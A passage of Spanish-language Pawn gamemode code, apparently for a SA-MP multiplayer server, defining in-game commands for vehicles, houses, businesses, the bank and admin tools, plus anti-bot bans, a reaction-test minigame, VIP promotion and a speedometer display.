    	//GivePlayerMoney(playerid, -10000);
		parkadmin(playerid);
	}else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
    return 1;
}
CMD:aparcar(playerid,params[]){
 	#pragma unused params
 	cmd_vpark(playerid,"\1");
 	return 1;
}
CMD:vlock(playerid,params[]) {
    #pragma unused params
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder usar este comando.");
	lock(playerid);
	return 1;
}
CMD:vunlock(playerid,params[]) {
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para poder usar este comando.");
    #pragma unused params
	unlock(playerid);
    return 1;
}
CMD:vcall(playerid,params[]) {
	new carid[128], Index;
	carid = strtok(params,Index);
	if(strval(carid) == 1) {
		callcar(playerid);
	}else if(strval(carid) == 2) {
		callcar2(playerid);
	}
	else if(strval(carid) == 3) {
		callcar3(playerid);
	}
	else if(strval(carid) == 4) {
		callcar4(playerid);
	}
	else if(strval(carid) == 5) {
		callcar5(playerid);
	}
	else if(strval(carid) == 6) {
		callcar6(playerid);
	}
	else if(strval(carid) == 7) {
		callcar7(playerid);
	}
	else if(strval(carid) == 8) {
		callcar8(playerid);
	}
	else if(strval(carid) == 9) {
		callcar9(playerid);
	}
	else if(strval(carid) == 10) {
		callcar10(playerid);
	}
	else {
		return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Vcall [1-10]");
	}
	return 1;
}
//------------------------------------Kill--------------------------------------
CMD:kill(playerid,params[]) {
	if(IsSpawned[playerid] == 1)
	{
		if(IsPlayerInAnyVehicle(playerid)) {
			if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) SetTimerEx("EraseVehicle", 5000,0,"i",GetPlayerVehicleID(playerid));
			if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) SetTimerEx("EraseVehicleConObjetos", 5000,0,"i",GetPlayerVehicleID(playerid));
		}
		new Float:health;
		if(GetPlayerHealth(playerid, health) >0) {
			SetPlayerHealth(playerid, 0);
			if(GetPlayerScore(playerid)>0){
				SetPlayerScore(playerid, GetPlayerScore(playerid)-1);
			}
			return 1;
		}
	}
	return 1;
}
//-------------------------------Business Menu----------------------------------
CMD:bmenu(playerid,params[]) {
    if(GetPlayerScore(playerid)<=75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para usar este menu.");
    ShowPlayerDialog(playerid, MenuNegocio, DIALOG_STYLE_LIST, "Menú de negocios", "{FF0000}*{FFFFFF} Menú de negocios (Normal)\n{FF0000}*{FFFFFF} Menú de negocios (Admin)", "Seleccionar", "Salir");
	return 1;
}
CMD:abmenu(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
    ShowPlayerDialog(playerid, MenuNegocio+2, DIALOG_STYLE_LIST, "Menú de negocios (Admin)", "{FF0000}*{FFFFFF} Vender negocio\n{FF0000}*{FFFFFF} Resetear todos los negocios", "Seleccionar", "Salir");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
CMD:asellallbiz(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	new Psicoloco[MAX_PLAYER_NAME];
	GetPlayerName(playerid, Psicoloco, sizeof(Psicoloco));
	if(!strcmp(NickPrincipal,Psicoloco,true)) return SendClientMessage(playerid,red,"|Info| »{FFFFFF}Solo Psicoloco puede usar este comando.");
    SendClientMessage(playerid, red, "|Info| »{EAEAEA} Este comando ha sido desactivado.");
    /*new string[128];
	aresetallbiz();
	fremove(B_FILE_SAVE);
	LoadBusinesses();
	format(string,sizeof(string),"|Info| »{FFFFFF} El administrador {0080FF}%s{FFFFFF} ha reseteado todos los negocios.", pName(playerid));
    SendClientMessageToAll(red,string);*/
    }
    else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
//-------------------------------Vehicle Menu-----------------------------------
CMD:vmenu(playerid,params[]) {
    if(GetPlayerScore(playerid)<=-75) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener mas de {FF0000}75{EAEAEA} de score para usar este menu.");
    ShowPlayerDialog(playerid, MenuVehiculo, DIALOG_STYLE_LIST, "Menú del vehiculo", "{FF0000}*{FFFFFF} Menú del vehículo (Normal)\n{FF0000}*{FFFFFF} Menú del vehículo (Admin)", "Seleccionar", "Salir");
	return 1;
}
CMD:avmenu(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
    ShowPlayerDialog(playerid, MenuVehiculo+2, DIALOG_STYLE_LIST, "Menú del vehiculo (Admin)", "{FF0000}*{FFFFFF} Vender vehiculo\n{FF0000}*{FFFFFF} Establecer el estado de compra\n{FF0000}*{FFFFFF} Bloquear vehiculo (Admin)\n{FF0000}*{FFFFFF} Aparcar vehiculo\n{FF0000}*{FFFFFF} Resetear vehiculo\n{FF0000}*{FFFFFF} Resetear todos los vehiculos", "Seleccionar", "Salir");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}

//--------------------------------House Menu------------------------------------
CMD:hmenu(playerid,params[]) {
    if(GetPlayerScore(playerid)<=-75) return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Debes tener mas de {FF0000}75{FFFFFF} de score para usar este menu.");
    ShowPlayerDialog(playerid, MenuCasa, DIALOG_STYLE_LIST, "Menú de casas", "{FF0000}*{FFFFFF} Menú de casas (Normal)\n{FF0000}*{FFFFFF} Menú casas (Admin)", "Seleccionar", "Salir");
	return 1;
}
CMD:ahmenu(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
    ShowPlayerDialog(playerid, MenuCasa+2, DIALOG_STYLE_LIST, "Menú de casas (Admin)", "{FF0000}*{FFFFFF} Vender casa\n{FF0000}*{FFFFFF} Resetear todas las casas\n{FF0000}*{FFFFFF} Crear casa pequeña\n{FF0000}*{FFFFFF} Crear casa mediana\n{FF0000}*{FFFFFF} Crear casa grande\n{FF0000}*{FFFFFF} Crear mansion", "Seleccionar", "Salir");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}

//------------------------------Teleport to Bank--------------------------------
CMD:bank(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al banco. {00BFFF}(/Bank)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Banco",2500,3);
	SendClientMessageToAll(red, fString);
	BloquearComandosInBank[playerid] = 1;
	Informacion[playerid][Bloqueado] = 1;
	GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
	GetPlayerFacingAngle(playerid,Pos[playerid][3]);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,6);
	//SetPlayerPos(playerid, 386.8961,173.5799,1008.3828);
	SetPlayerPos(playerid, -297.0317,1485.2622,1071.1060);
	ResetPlayerWeapons(playerid);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:exitbank(playerid,params[]) {
	if(PlayerInfo[playerid][Jailed] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando encarcelado.");
	if(CloseToBank(playerid) == 999) {
		return 1;
	}
	BloquearComandosInBank[playerid] = 0;
	SetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
	SetPlayerFacingAngle(playerid,Pos[playerid][3]);
	SetCameraBehindPlayer(playerid);
	SetPlayerInterior(playerid,tinteriorid);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma0"), dUserINT(PlayerName2(playerid)).("arma0balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma1"), dUserINT(PlayerName2(playerid)).("arma1balas")	);
 	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma2"), dUserINT(PlayerName2(playerid)).("arma2balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma3"), dUserINT(PlayerName2(playerid)).("arma3balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma4"), dUserINT(PlayerName2(playerid)).("arma4balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma5"), dUserINT(PlayerName2(playerid)).("arma5balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma6"), dUserINT(PlayerName2(playerid)).("arma6balas")	);
	//GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma7"), dUserINT(PlayerName2(playerid)).("arma7balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma9"), dUserINT(PlayerName2(playerid)).("arma9balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma10"), dUserINT(PlayerName2(playerid)).("arma10balas")	);
	GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma12"), dUserINT(PlayerName2(playerid)).("arma12balas")	);
	SavePlayer(playerid);
	return 1;
}
//----------------------------HOUSE + HOUSE CAR SAVING--------------------------
CMD:housesmall(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][Level] >=10 || IsPlayerAdmin(playerid)) {
		new ID = HouseID++;
		new Float:X, Float:Y, Float:Z;
		new File:handle = fopen(SaveFile, io_append);
		GetPlayerPos(playerid, X, Y, Z);
		format(string, sizeof(string), "AddHouse(%d, %f, %f, %f, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 0); //Casa pequeña ;)\r\n", ID, X, Y, Z);
		print(string);
		fwrite(handle, string);
		fclose(handle);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		CreatePlayerObject(playerid, 1273, Float:X, Float:Y, Float:Z, 0, 0, 0);
	} else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
    return 1;
}
CMD:housemedium(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][Level] >=10 || IsPlayerAdmin(playerid)) {
		new ID = HouseID++;
		new Float:X, Float:Y, Float:Z;
		new File:handle = fopen(SaveFile, io_append);
		GetPlayerPos(playerid, X, Y, Z);
		format(string, sizeof(string), "AddHouse(%d, %f, %f, %f, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 0);//Casa mediana\r\n", ID, X, Y, Z);
		print(string);
		fwrite(handle, string);
		fclose(handle);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		CreatePlayerObject(playerid, 1273, Float:X, Float:Y, Float:Z, 0, 0, 0);
	    } else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
    return 1;
}
CMD:housemodern(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][Level] >=10 || IsPlayerAdmin(playerid)) {
		new ID = HouseID++;
		new Float:X, Float:Y, Float:Z;
		new File:handle = fopen(SaveFile, io_append);
		GetPlayerPos(playerid, X, Y, Z);
		format(string, sizeof(string), "AddHouse(%d, %f, %f, %f, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 0);//Casa grande\r\n", ID, X, Y, Z);
		print(string);
		fwrite(handle, string);
		fclose(handle);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		CreatePlayerObject(playerid, 1273, Float:X, Float:Y, Float:Z, 0, 0, 0);
	    } else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
    return 1;
}
CMD:housemansion(playerid,params[]) {
	new string[128];
	if(PlayerInfo[playerid][Level] >=10 || IsPlayerAdmin(playerid)) {
		new ID = HouseID++;
		new Float:X, Float:Y, Float:Z;
		new File:handle = fopen(SaveFile, io_append);
		GetPlayerPos(playerid, X, Y, Z);
		format(string, sizeof(string), "AddHouse(%d, %f, %f, %f, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 0); //Mansion\r\n", ID, X, Y, Z);
		print(string);
		fwrite(handle, string);
		fclose(handle);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		CreatePlayerObject(playerid, 1273, Float:X, Float:Y, Float:Z, 0, 0, 0);
	    } else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
    return 1;
}

CMD:resetunbuyables(playerid,params[]) {
	if (PlayerInfo[playerid][Level] >= 10 && PlayerInfo[playerid][LoggedIn] == 1) {
		for(new v = 0; v < MAX_VEHICLES; v++){
			if(VehicleInfo[v][buybar] ==1) {
				VehicleInfo[v][buybar] =0;
				VehicleInfo[v][x_spawn] = VehicleInfo[v][ox_spawn];
				VehicleInfo[v][y_spawn] = VehicleInfo[v][oy_spawn];
				VehicleInfo[v][z_spawn] = VehicleInfo[v][oz_spawn];
				VehicleInfo[v][za_spawn] = VehicleInfo[v][oza_spawn];
			}
		}
		SendClientMessage(playerid,COLOR_RED, "Unbuyable Vehicles Have Been Set Buyable and Unparked.");
	}
	return 1;
}
CMD:respawncars(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >=4 || IsPlayerAdmin(playerid)) {
		GameTextForAll("~n~~n~~n~~n~~n~~n~~w~Vehiculos ~r~Respawneados", 3000,3);
        CMDMessageToAdmins(playerid,"/RespawnCars");
        new string[120]; format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha respawneado todos los vehiculos.", pName(playerid));
        SendClientMessageToAll(red,string);
		for(new v=0;v<MAX_VEHICLES;v++) EraseVehicle(v);
		EraseVehicleConObjetos();
	}
	else
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
		return 1;
	}
	return 1;
}

CMD:payday(playerid,params[]){
	if(PlayerInfo[playerid][Level] >=10 || IsPlayerAdmin(playerid)) {
		PayDay();
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}

stock IsValidAnnounce(string[])
{
    for(new i = 0, j = strlen(string); i < j; i++)
    {
        switch(string[i])
        {
            case '0' .. '9': continue;
            case 'a' .. 'z': continue;
            case 'A' .. 'Z': continue;
            case '_': continue;
            case '-': continue;
            case '$': continue;
            case '.': continue;
            case '>': continue;
            case '<': continue;
            case '=': continue;
            case '(': continue;
            case ')': continue;
            case '[': continue;
            case ']': continue;
            case '/': continue;
            case '?': continue;
            case '!': continue;
            case ' ': continue;
            case ':': continue;
            case ';': continue;
			case 'á': continue;
			case 'Á': continue;
			case 'é': continue;
			case 'É': continue;
			case 'í': continue;
			case 'Í': continue;
			case 'ó': continue;
			case 'Ó': continue;
			case 'ú': continue;
			case 'Ú': continue;
			case 'ñ': continue;
			case 'Ñ': continue;
            default: return 0;
        }
    }
    return 1;
}
stock DetectarIP(IP[])
{
	new Codigo = 0;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !strcmp(ObtenerIP(i), IP)) Codigo++;
	return Codigo;
}
stock ObtenerIP(playerid)
{
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));
	return IP;
}
stock BanearBots(playerid)
{
	new IP[32];
	//new Texto[140];
	new Nombre[MAX_PLAYER_NAME];
	GetPlayerIp(playerid, IP, sizeof(IP));
	if(AntiBots==1)
	{
		for(new i = 0, PingUp = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !BotServidor[i])
		{
			PingUp = GetPlayerPing(i);
			if(i == playerid || !strcmp(IP, ObtenerIP(i)) || PingUp <= 0 || PingUp >= 50000)
			{
				GetPlayerName(playerid, Nombre, sizeof(Nombre));
				//SendClientMessage( playerid, red, "|Info| »{FFFFFF} Fuiste baneado por posible intento de Bots.");
				//format(Texto, sizeof(Texto), "{EAEAEA}%s(%d) ha sido baneado. {FF0000}(Posible Bots)", Nombre, playerid);
				//SendClientMessageToAll(red, Texto);
				//SaveToFile("BanLog",Texto);
				if(udb_Exists(PlayerName2(playerid)) && PlayerInfo[playerid][LoggedIn] == 1) dUserSetINT(PlayerName2(playerid)).("banned",1);
				BanEx(playerid, "Baneado por intento de Bot");
				if(Barra[i] != -1)
				{
					KillTimer(Barra[i]);
					Barra[i] = -1;
				}
			}
		}
		format(IP, sizeof(IP), "banip %s", IP);
		SendRconCommand(IP);
	}
	return 1;
}
stock Jugador2(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}
stock IDMayor(exceptof = INVALID_PLAYER_ID)
{
	new MaxID = 0;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != exceptof && i > MaxID) MaxID = i;
	return MaxID;
}
stock ArmaProhibida(playerid)
{
	new Arma = GetPlayerWeapon(playerid);
	if( Arma == 35|| Arma == 36|| Arma == 37|| Arma == 38)
	{
		return true;
	}
	return false;
}
stock TeleportPlayer(playerid, Float:x,Float:y,Float:z)
{
	new cartype = GetPlayerVehicleID(playerid);
	new State=GetPlayerState(playerid);
	if(State!=PLAYER_STATE_DRIVER)
	{
		SetPlayerPos(playerid,x,y,z);
	}
	else if(IsPlayerInVehicle(playerid, cartype) == 1)
	{
		SetVehiclePos(cartype,x,y,z);
	}
	else
	{
		SetPlayerPos(playerid,x,y,z);
	}
	SetPlayerInterior(playerid,0);
}

function xReactionProgress(playerid)
{
	switch(xTestBusy)
	{
		case true:
		{
			new string[90];
			xTestBusy = false;
			KillTimer(Reaction[playerid]);
			format(string, sizeof(string), "|Test| »{EAEAEA} Nadie gano el test de reacción. Empezara otro en %d minutos", (TIME/60000));
			SendClientMessageToAll(red, string);
			xReactionTimer = SetTimer("xReactionTest", TIME, 1);
		}
	}
	return 1;
}
function xReactionTest(playerid)
{
	new
	xLength = (random(8) + 2)
	;
	xCash = (random(1000) + 5000);
	xScore = (random(10)+1);
	new string[145];
	format(xChars, sizeof(xChars), "");
	Loop(x, xLength) format(xChars, sizeof(xChars), "%s%s", xChars, xCharacters[random(sizeof(xCharacters))][0]);
	format(string, sizeof(string), "|Test| »{EAEAEA} El primero en escribir {FFFF00}%s{EAEAEA} ganara {52C433}$%d{EAEAEA} + %d de score.", xChars, xCash, xScore);
	SendClientMessageToAll(red, string);
	KillTimer(xReactionTimer);
	xTestBusy = true;
	Reaction[playerid] = SetTimer("xReactionProgress", 30000, 0);
	return 1;
}

stock SetPlayerVip(playerid)
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		new Score;
		Score=GetPlayerScore(playerid);
		if(3000 < Score >= 10000)
		{
			if(PlayerInfo[playerid][Vip] < 3)
			{
				new InfoVip[128];
				format(InfoVip, sizeof(InfoVip), "|Info| »{0080FF} %s{FFFFFF} llego a los 10.000 de score y fue promovido a {00BFFF}Vip Nivel 3.", PlayerName2(playerid));
				SendClientMessageToAll(red,InfoVip);
				GameTextForPlayer(playerid,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
				SaveToFile("Viplog",InfoVip);
				dUserSetINT(PlayerName2(playerid)).("vip",(3));
				PlayerInfo[playerid][Vip] = 3;
				ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}FELICIDADES!","{FFFFFF}Felicidades!\nHas conseguido el score necesario para ser {00BFFF}Vip Nivel 3.{FFFFFF}\nAhora eres {00BFFF}Vip Nivel 3.{FFFFFF}\nUsa {C0C0C0}/Vlevel3{FFFFFF} para ver los comandos que puedes usar.", "Aceptar", "");
			}
			return 1;
		}
		else if(1500 < Score >= 3000)
		{
			if(PlayerInfo[playerid][Vip] < 2)
			{
				new InfoVip[128];
				format(InfoVip, sizeof(InfoVip), "|Info| »{0080FF} %s{FFFFFF} llego a los 2.500 de score y fue promovido a {FFFF00}Vip Nivel 2.", PlayerName2(playerid));
				SendClientMessageToAll(red,InfoVip);
				GameTextForPlayer(playerid,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
				SaveToFile("Viplog",InfoVip);
				dUserSetINT(PlayerName2(playerid)).("vip",(2));
				PlayerInfo[playerid][Vip] = 2;
				ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}FELICIDADES!","{FFFFFF}Felicidades!\nHas conseguido el score necesario para ser {FFFF00}Vip Nivel 2.{FFFFFF}\nAhora eres {FFFF00}Vip Nivel 2.{FFFFFF}\nUsa {C0C0C0}/Vlevel2{FFFFFF} para ver los comandos que puedes usar.", "Aceptar", "");
			}
			return 1;
		}
		else if(Score >= 1500 )
		{
			if(PlayerInfo[playerid][Vip] < 1)
			{
				new InfoVip[128];
				format(InfoVip, sizeof(InfoVip), "|Info| »{0080FF} %s{FFFFFF} llego a los 1.000 de score y fue promovido a {00FF00}Vip Nivel 1.", PlayerName2(playerid));
				SendClientMessageToAll(red,InfoVip);
				GameTextForPlayer(playerid,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
				SaveToFile("Viplog",InfoVip);
				dUserSetINT(PlayerName2(playerid)).("vip",(1));
				PlayerInfo[playerid][Vip] = 1;
				ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}FELICIDADES!","{FFFFFF}Felicidades!\nHas conseguido el score necesario para ser {00FF00}Vip Nivel 1.{FFFFFF}\nAhora eres {00FF00}Vip Nivel 1.{FFFFFF}\nUsa {C0C0C0}/Vlevel1{FFFFFF} para ver los comandos que puedes usar.", "Aceptar", "");
			}
			return 1;
		}
	}
	return 1;
}

forward DetenerSonido(playerid);
public DetenerSonido(playerid)
{
    KillTimer(DetenerS);
    for(new i = 0; i < MAX_PLAYERS; i++) {
		if(IsPlayerConnected(i))
		{
			PlayerPlaySound(i,1143,0.0,0.0,0.0);
		}
	}
	return 1;
}

public BombTimer(playerid)
{
	CreateExplosion(BombX[playerid], BombY[playerid], BombZ[playerid], 10, 15);
	SendClientMessage(playerid, red, "|Bomba| »{EAEAEA} La bomba ha explotado.");
	DestroyObject(BombObject[playerid]);
	BombArmed[playerid] = false;
	return 1;
}


//================================== VELOCIMETRO =================================//
//====================================Speedo====================================
public LuX_SpeedoMeterUp()
{
	new Float:LPosX;
	new Float:LPosY;
	new Float:LPosZ;
	new Float:L_VehHealth;
	new LVehicleStatus[26];
	for(new i=0; i<PLAYERS; i++)
	{
		if (strcmp(VehicleInfo[GetPlayerVehicleID(i)][owner],PlayerInfo[i][name],false) == 0 && PlayerInfo[i][LoggedIn] == 1) {
			if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
			{
				LVehicleStatus = "~w~Bloqueado";
			}
			else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
			{
				LVehicleStatus = "~w~Desbloqueado";
			}
		}
		else {
			if(PlayerInfo[i][DoorsLocked] == 1)
			{
				LVehicleStatus = "~w~Bloqueado";
			}
			else
			{
				LVehicleStatus = "~w~Desbloqueado";
			}
		}
		if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 0)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 1)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 1 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 2 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 1 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Bloqueado";
		}
		else if(PlayerInfo[i][DoorsLocked] == 0 && VehicleInfo[GetPlayerVehicleID(i)][secure] == 0 && VehicleInfo[GetPlayerVehicleID(i)][asecure] == 2)
		{
			LVehicleStatus = "~w~Desbloqueado";
		}
		if(speedo[i] == 0) {
			TextDrawHideForPlayer(i, LBox[i]);
			TextDrawHideForPlayer(i, LLine1[i]);
			TextDrawHideForPlayer(i, LLine2[i]);
			TextDrawHideForPlayer(i, LLine3[i]);
			TextDrawHideForPlayer(i, LLine4[i]);
			TextDrawHideForPlayer(i, LCredits[i]);
			TextDrawHideForPlayer(i, Lmph[i]);
			TextDrawHideForPlayer(i, LFunc[i]);
			LuX_SpeedoMeter[i] = 0;
		}
		if(speedo[i] == 1){
			if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i))
			{
				GetPlayerPos(i, LPosX, LPosY, LPosZ);
				GetPlayerVehicleID(i);
				GetVehicleHealth(GetPlayerVehicleID(i), L_VehHealth);
				new LuxZone[MAX_ZONE_NAME];
				GetPlayer2DZone(i, LuxZone, MAX_ZONE_NAME);
				if(LuX_SpeedoMeter[i] == 0){
					TextDrawShowForPlayer(i, LBox[i]);
					TextDrawShowForPlayer(i, LLine1[i]);
					TextDrawShowForPlayer(i, LLine2[i]);
					TextDrawShowForPlayer(i, LLine3[i]);
					TextDrawShowForPlayer(i, LLine4[i]);
					TextDrawShowForPlayer(i, LCredits[i]);
					TextDrawShowForPlayer(i, Lmph[i]);
					TextDrawShowForPlayer(i, LFunc[i]);
					LuX_SpeedoMeter[i] = 1;
				}
				format(lstring,sizeof(lstring),"~r~Vehiculo: ~w~%s~n~~r~Vida: ~w~%.2f~n~~r~Altitud: ~w~%.1f~n~~r~Gps: ~w~%s~n~~r~Estado: %s",VehicleName[GetVehicleModel(GetPlayerVehicleID(i))-400],L_VehHealth,LPosZ,LuxZone,LVehicleStatus);
				TextDrawSetString(LFunc[i], lstring);
				format(lstr,sizeof(lstr),"~r~%sMPH: ~w~%d  ~r~%sKM/H: ~w~%d",MPH_KPH_Color,GetPlayerSpeed(i,false),MPH_KPH_Color,GetPlayerSpeed(i,true));
				TextDrawSetString(Lmph[i], lstr);
				if(L_VehHealth <= 500){
